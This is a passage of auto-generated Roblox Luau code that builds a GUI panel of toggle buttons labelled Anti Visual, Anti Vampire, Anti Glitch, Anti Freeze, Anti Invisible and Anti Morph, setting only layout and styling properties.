-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.visual.button.toggleFrame.toggleFade
G2L["1dc"] = Instance.new("CanvasGroup", G2L["1da"]);
G2L["1dc"]["BorderSizePixel"] = 0;
G2L["1dc"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1dc"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1dc"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["1dc"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1dc"]["Name"] = [[toggleFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.visual.button.toggleFrame.toggleFade.UIGradient
G2L["1dd"] = Instance.new("UIGradient", G2L["1dc"]);
G2L["1dd"]["Rotation"] = 90;
G2L["1dd"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.visual.text
G2L["1de"] = Instance.new("TextLabel", G2L["1d7"]);
G2L["1de"]["TextWrapped"] = true;
G2L["1de"]["BorderSizePixel"] = 0;
G2L["1de"]["TextSize"] = 14;
G2L["1de"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["1de"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1de"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1de"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1de"]["BackgroundTransparency"] = 1;
G2L["1de"]["Size"] = UDim2.new(0, 156, 0, 20);
G2L["1de"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1de"]["Text"] = [[Anti Visual]];
G2L["1de"]["Name"] = [[text]];
G2L["1de"]["Position"] = UDim2.new(0.10227, 0, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.visual.text.UIPadding
G2L["1df"] = Instance.new("UIPadding", G2L["1de"]);
G2L["1df"]["PaddingLeft"] = UDim.new(0, 5);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.visual.text.text
G2L["1e0"] = Instance.new("UIStroke", G2L["1de"]);
G2L["1e0"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.visual.UIPadding
G2L["1e1"] = Instance.new("UIPadding", G2L["1d7"]);
G2L["1e1"]["PaddingLeft"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.vampire
G2L["1e2"] = Instance.new("Frame", G2L["1bb"]);
G2L["1e2"]["BorderSizePixel"] = 0;
G2L["1e2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1e2"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["1e2"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["1e2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1e2"]["Name"] = [[vampire]];
G2L["1e2"]["LayoutOrder"] = 2;
G2L["1e2"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.vampire.button
G2L["1e3"] = Instance.new("TextButton", G2L["1e2"]);
G2L["1e3"]["BorderSizePixel"] = 0;
G2L["1e3"]["TextTransparency"] = 1;
G2L["1e3"]["TextSize"] = 14;
G2L["1e3"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1e3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1e3"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1e3"]["BackgroundTransparency"] = 1;
G2L["1e3"]["Size"] = UDim2.new(0, 20, 0, 20);
G2L["1e3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1e3"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.vampire.button.UIPadding
G2L["1e4"] = Instance.new("UIPadding", G2L["1e3"]);
G2L["1e4"]["PaddingTop"] = UDim.new(0, 3);
G2L["1e4"]["PaddingRight"] = UDim.new(0, 3);
G2L["1e4"]["PaddingLeft"] = UDim.new(0, 3);
G2L["1e4"]["PaddingBottom"] = UDim.new(0, 3);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.vampire.button.toggleFrame
G2L["1e5"] = Instance.new("Frame", G2L["1e3"]);
G2L["1e5"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["1e5"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["1e5"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["1e5"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["1e5"]["Name"] = [[toggleFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.vampire.button.toggleFrame.outlineStroke
G2L["1e6"] = Instance.new("UIStroke", G2L["1e5"]);
G2L["1e6"]["Thickness"] = 2;
G2L["1e6"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.vampire.button.toggleFrame.toggleFade
G2L["1e7"] = Instance.new("CanvasGroup", G2L["1e5"]);
G2L["1e7"]["BorderSizePixel"] = 0;
G2L["1e7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1e7"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1e7"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["1e7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1e7"]["Name"] = [[toggleFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.vampire.button.toggleFrame.toggleFade.UIGradient
G2L["1e8"] = Instance.new("UIGradient", G2L["1e7"]);
G2L["1e8"]["Rotation"] = 90;
G2L["1e8"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.vampire.text
G2L["1e9"] = Instance.new("TextLabel", G2L["1e2"]);
G2L["1e9"]["TextWrapped"] = true;
G2L["1e9"]["BorderSizePixel"] = 0;
G2L["1e9"]["TextSize"] = 14;
G2L["1e9"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["1e9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1e9"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1e9"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1e9"]["BackgroundTransparency"] = 1;
G2L["1e9"]["Size"] = UDim2.new(0, 156, 0, 20);
G2L["1e9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1e9"]["Text"] = [[Anti Vampire]];
G2L["1e9"]["Name"] = [[text]];
G2L["1e9"]["Position"] = UDim2.new(0.10227, 0, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.vampire.text.UIPadding
G2L["1ea"] = Instance.new("UIPadding", G2L["1e9"]);
G2L["1ea"]["PaddingLeft"] = UDim.new(0, 5);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.vampire.text.text
G2L["1eb"] = Instance.new("UIStroke", G2L["1e9"]);
G2L["1eb"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.vampire.UIPadding
G2L["1ec"] = Instance.new("UIPadding", G2L["1e2"]);
G2L["1ec"]["PaddingLeft"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.glitch
G2L["1ed"] = Instance.new("Frame", G2L["1bb"]);
G2L["1ed"]["BorderSizePixel"] = 0;
G2L["1ed"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1ed"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["1ed"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["1ed"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1ed"]["Name"] = [[glitch]];
G2L["1ed"]["LayoutOrder"] = 2;
G2L["1ed"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.glitch.button
G2L["1ee"] = Instance.new("TextButton", G2L["1ed"]);
G2L["1ee"]["BorderSizePixel"] = 0;
G2L["1ee"]["TextTransparency"] = 1;
G2L["1ee"]["TextSize"] = 14;
G2L["1ee"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1ee"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1ee"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1ee"]["BackgroundTransparency"] = 1;
G2L["1ee"]["Size"] = UDim2.new(0, 20, 0, 20);
G2L["1ee"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1ee"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.glitch.button.UIPadding
G2L["1ef"] = Instance.new("UIPadding", G2L["1ee"]);
G2L["1ef"]["PaddingTop"] = UDim.new(0, 3);
G2L["1ef"]["PaddingRight"] = UDim.new(0, 3);
G2L["1ef"]["PaddingLeft"] = UDim.new(0, 3);
G2L["1ef"]["PaddingBottom"] = UDim.new(0, 3);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.glitch.button.toggleFrame
G2L["1f0"] = Instance.new("Frame", G2L["1ee"]);
G2L["1f0"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["1f0"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["1f0"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["1f0"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["1f0"]["Name"] = [[toggleFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.glitch.button.toggleFrame.outlineStroke
G2L["1f1"] = Instance.new("UIStroke", G2L["1f0"]);
G2L["1f1"]["Thickness"] = 2;
G2L["1f1"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.glitch.button.toggleFrame.toggleFade
G2L["1f2"] = Instance.new("CanvasGroup", G2L["1f0"]);
G2L["1f2"]["BorderSizePixel"] = 0;
G2L["1f2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1f2"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1f2"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["1f2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1f2"]["Name"] = [[toggleFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.glitch.button.toggleFrame.toggleFade.UIGradient
G2L["1f3"] = Instance.new("UIGradient", G2L["1f2"]);
G2L["1f3"]["Rotation"] = 90;
G2L["1f3"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.glitch.text
G2L["1f4"] = Instance.new("TextLabel", G2L["1ed"]);
G2L["1f4"]["TextWrapped"] = true;
G2L["1f4"]["BorderSizePixel"] = 0;
G2L["1f4"]["TextSize"] = 14;
G2L["1f4"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["1f4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1f4"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1f4"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1f4"]["BackgroundTransparency"] = 1;
G2L["1f4"]["Size"] = UDim2.new(0, 156, 0, 20);
G2L["1f4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1f4"]["Text"] = [[Anti Glitch]];
G2L["1f4"]["Name"] = [[text]];
G2L["1f4"]["Position"] = UDim2.new(0.10227, 0, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.glitch.text.UIPadding
G2L["1f5"] = Instance.new("UIPadding", G2L["1f4"]);
G2L["1f5"]["PaddingLeft"] = UDim.new(0, 5);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.glitch.text.text
G2L["1f6"] = Instance.new("UIStroke", G2L["1f4"]);
G2L["1f6"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.glitch.UIPadding
G2L["1f7"] = Instance.new("UIPadding", G2L["1ed"]);
G2L["1f7"]["PaddingLeft"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.freeze
G2L["1f8"] = Instance.new("Frame", G2L["1bb"]);
G2L["1f8"]["BorderSizePixel"] = 0;
G2L["1f8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1f8"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["1f8"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["1f8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1f8"]["Name"] = [[freeze]];
G2L["1f8"]["LayoutOrder"] = 5;
G2L["1f8"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.freeze.button
G2L["1f9"] = Instance.new("TextButton", G2L["1f8"]);
G2L["1f9"]["BorderSizePixel"] = 0;
G2L["1f9"]["TextTransparency"] = 1;
G2L["1f9"]["TextSize"] = 14;
G2L["1f9"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1f9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1f9"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1f9"]["BackgroundTransparency"] = 1;
G2L["1f9"]["Size"] = UDim2.new(0, 20, 0, 20);
G2L["1f9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1f9"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.freeze.button.UIPadding
G2L["1fa"] = Instance.new("UIPadding", G2L["1f9"]);
G2L["1fa"]["PaddingTop"] = UDim.new(0, 3);
G2L["1fa"]["PaddingRight"] = UDim.new(0, 3);
G2L["1fa"]["PaddingLeft"] = UDim.new(0, 3);
G2L["1fa"]["PaddingBottom"] = UDim.new(0, 3);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.freeze.button.toggleFrame
G2L["1fb"] = Instance.new("Frame", G2L["1f9"]);
G2L["1fb"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["1fb"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["1fb"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["1fb"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["1fb"]["Name"] = [[toggleFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.freeze.button.toggleFrame.outlineStroke
G2L["1fc"] = Instance.new("UIStroke", G2L["1fb"]);
G2L["1fc"]["Thickness"] = 2;
G2L["1fc"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.freeze.button.toggleFrame.toggleFade
G2L["1fd"] = Instance.new("CanvasGroup", G2L["1fb"]);
G2L["1fd"]["BorderSizePixel"] = 0;
G2L["1fd"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1fd"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1fd"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["1fd"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1fd"]["Name"] = [[toggleFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.freeze.button.toggleFrame.toggleFade.UIGradient
G2L["1fe"] = Instance.new("UIGradient", G2L["1fd"]);
G2L["1fe"]["Rotation"] = 90;
G2L["1fe"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.freeze.text
G2L["1ff"] = Instance.new("TextLabel", G2L["1f8"]);
G2L["1ff"]["TextWrapped"] = true;
G2L["1ff"]["BorderSizePixel"] = 0;
G2L["1ff"]["TextSize"] = 14;
G2L["1ff"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["1ff"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1ff"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1ff"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1ff"]["BackgroundTransparency"] = 1;
G2L["1ff"]["Size"] = UDim2.new(0, 156, 0, 20);
G2L["1ff"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1ff"]["Text"] = [[Anti Freeze]];
G2L["1ff"]["Name"] = [[text]];
G2L["1ff"]["Position"] = UDim2.new(0.10227, 0, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.freeze.text.UIPadding
G2L["200"] = Instance.new("UIPadding", G2L["1ff"]);
G2L["200"]["PaddingLeft"] = UDim.new(0, 5);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.freeze.text.text
G2L["201"] = Instance.new("UIStroke", G2L["1ff"]);
G2L["201"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.freeze.UIPadding
G2L["202"] = Instance.new("UIPadding", G2L["1f8"]);
G2L["202"]["PaddingLeft"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.invisible
G2L["203"] = Instance.new("Frame", G2L["1bb"]);
G2L["203"]["BorderSizePixel"] = 0;
G2L["203"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["203"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["203"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["203"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["203"]["Name"] = [[invisible]];
G2L["203"]["LayoutOrder"] = 5;
G2L["203"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.invisible.button
G2L["204"] = Instance.new("TextButton", G2L["203"]);
G2L["204"]["BorderSizePixel"] = 0;
G2L["204"]["TextTransparency"] = 1;
G2L["204"]["TextSize"] = 14;
G2L["204"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["204"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["204"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["204"]["BackgroundTransparency"] = 1;
G2L["204"]["Size"] = UDim2.new(0, 20, 0, 20);
G2L["204"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["204"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.invisible.button.UIPadding
G2L["205"] = Instance.new("UIPadding", G2L["204"]);
G2L["205"]["PaddingTop"] = UDim.new(0, 3);
G2L["205"]["PaddingRight"] = UDim.new(0, 3);
G2L["205"]["PaddingLeft"] = UDim.new(0, 3);
G2L["205"]["PaddingBottom"] = UDim.new(0, 3);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.invisible.button.toggleFrame
G2L["206"] = Instance.new("Frame", G2L["204"]);
G2L["206"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["206"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["206"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["206"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["206"]["Name"] = [[toggleFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.invisible.button.toggleFrame.outlineStroke
G2L["207"] = Instance.new("UIStroke", G2L["206"]);
G2L["207"]["Thickness"] = 2;
G2L["207"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.invisible.button.toggleFrame.toggleFade
G2L["208"] = Instance.new("CanvasGroup", G2L["206"]);
G2L["208"]["BorderSizePixel"] = 0;
G2L["208"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["208"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["208"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["208"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["208"]["Name"] = [[toggleFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.invisible.button.toggleFrame.toggleFade.UIGradient
G2L["209"] = Instance.new("UIGradient", G2L["208"]);
G2L["209"]["Rotation"] = 90;
G2L["209"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.invisible.text
G2L["20a"] = Instance.new("TextLabel", G2L["203"]);
G2L["20a"]["TextWrapped"] = true;
G2L["20a"]["BorderSizePixel"] = 0;
G2L["20a"]["TextSize"] = 14;
G2L["20a"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["20a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["20a"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["20a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["20a"]["BackgroundTransparency"] = 1;
G2L["20a"]["Size"] = UDim2.new(0, 156, 0, 20);
G2L["20a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["20a"]["Text"] = [[Anti Invisible]];
G2L["20a"]["Name"] = [[text]];
G2L["20a"]["Position"] = UDim2.new(0.10227, 0, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.invisible.text.UIPadding
G2L["20b"] = Instance.new("UIPadding", G2L["20a"]);
G2L["20b"]["PaddingLeft"] = UDim.new(0, 5);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.invisible.text.text
G2L["20c"] = Instance.new("UIStroke", G2L["20a"]);
G2L["20c"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.invisible.UIPadding
G2L["20d"] = Instance.new("UIPadding", G2L["203"]);
G2L["20d"]["PaddingLeft"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.morph
G2L["20e"] = Instance.new("Frame", G2L["1bb"]);
G2L["20e"]["BorderSizePixel"] = 0;
G2L["20e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["20e"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["20e"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["20e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["20e"]["Name"] = [[morph]];
G2L["20e"]["LayoutOrder"] = 5;
G2L["20e"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.morph.button
G2L["20f"] = Instance.new("TextButton", G2L["20e"]);
G2L["20f"]["BorderSizePixel"] = 0;
G2L["20f"]["TextTransparency"] = 1;
G2L["20f"]["TextSize"] = 14;
G2L["20f"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["20f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["20f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["20f"]["BackgroundTransparency"] = 1;
G2L["20f"]["Size"] = UDim2.new(0, 20, 0, 20);
G2L["20f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["20f"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.morph.button.UIPadding
G2L["210"] = Instance.new("UIPadding", G2L["20f"]);
G2L["210"]["PaddingTop"] = UDim.new(0, 3);
G2L["210"]["PaddingRight"] = UDim.new(0, 3);
G2L["210"]["PaddingLeft"] = UDim.new(0, 3);
G2L["210"]["PaddingBottom"] = UDim.new(0, 3);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.morph.button.toggleFrame
G2L["211"] = Instance.new("Frame", G2L["20f"]);
G2L["211"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["211"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["211"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["211"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["211"]["Name"] = [[toggleFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.morph.button.toggleFrame.outlineStroke
G2L["212"] = Instance.new("UIStroke", G2L["211"]);
G2L["212"]["Thickness"] = 2;
G2L["212"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.morph.button.toggleFrame.toggleFade
G2L["213"] = Instance.new("CanvasGroup", G2L["211"]);
G2L["213"]["BorderSizePixel"] = 0;
G2L["213"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["213"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["213"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["213"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["213"]["Name"] = [[toggleFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.morph.button.toggleFrame.toggleFade.UIGradient
G2L["214"] = Instance.new("UIGradient", G2L["213"]);
G2L["214"]["Rotation"] = 90;
G2L["214"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.morph.text
G2L["215"] = Instance.new("TextLabel", G2L["20e"]);
G2L["215"]["TextWrapped"] = true;
G2L["215"]["BorderSizePixel"] = 0;
G2L["215"]["TextSize"] = 14;
G2L["215"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["215"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["215"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["215"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["215"]["BackgroundTransparency"] = 1;
G2L["215"]["Size"] = UDim2.new(0, 156, 0, 20);
G2L["215"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["215"]["Text"] = [[Anti Morph]];
G2L["215"]["Name"] = [[text]];
G2L["215"]["Position"] = UDim2.new(0.10227, 0, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.morph.text.UIPadding
G2L["216"] = Instance.new("UIPadding", G2L["215"]);
